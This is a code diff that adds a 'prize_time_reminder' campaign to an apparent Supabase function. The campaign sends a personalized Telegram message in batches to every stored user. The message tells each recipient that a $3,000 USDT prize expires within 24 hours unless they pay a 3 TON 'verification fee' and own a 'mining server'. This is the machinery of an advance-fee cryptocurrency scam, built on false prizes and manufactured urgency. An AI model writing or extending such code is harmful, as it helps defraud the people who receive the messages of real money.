@@ -405,6 +405,64 @@ Open the app now and withdraw your reward!`;
         }),
         { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
       );
+
+    } else if (campaign_type === 'prize_time_reminder') {
+      // Get batch of users with their username for personalized message
+      const { data: users, error } = await supabase
+        .from('bolt_users')
+        .select('id, telegram_id, telegram_username, first_name')
+        .not('telegram_id', 'is', null)
+        .range(offset, offset + batch_size - 1);
+
+      if (error) throw error;
+
+      console.log(`Processing ${users?.length || 0} users for prize time reminder`);
+
+      for (const user of users || []) {
+        const displayName = user.telegram_username 
+          ? `@${user.telegram_username}` 
+          : (user.first_name || 'Winner');
+        
+        const message = `Hey ${displayName}!
+
+TIME IS RUNNING OUT!
+
+Your $3,000 USDT prize expires SOON!
+
+Less than 24 hours left to claim your reward!
+
+Requirements to withdraw:
+1. Pay verification fee (3 TON)
+2. Own a mining server
+
+Don't lose your $3,000 - Complete verification now and withdraw before time runs out!
+
+Open the app and claim your prize NOW!`;
+
+        const sent = await sendTelegramMessage(user.telegram_id, message);
+        if (sent) {
+          sentCount++;
+        } else {
+          failedCount++;
+        }
+
+        await new Promise(r => setTimeout(r, 25));
+      }
+
+      const hasMore = (users?.length || 0) === batch_size;
+      
+      console.log(`Batch complete: ${sentCount} sent, ${failedCount} failed`);
+
+      return new Response(
+        JSON.stringify({ 
+          success: true, 
+          sent: sentCount,
+          failed: failedCount,
+          hasMore,
+          nextOffset: hasMore ? offset + batch_size : null
+        }),
+        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
+      );
     }
 
     return new Response(
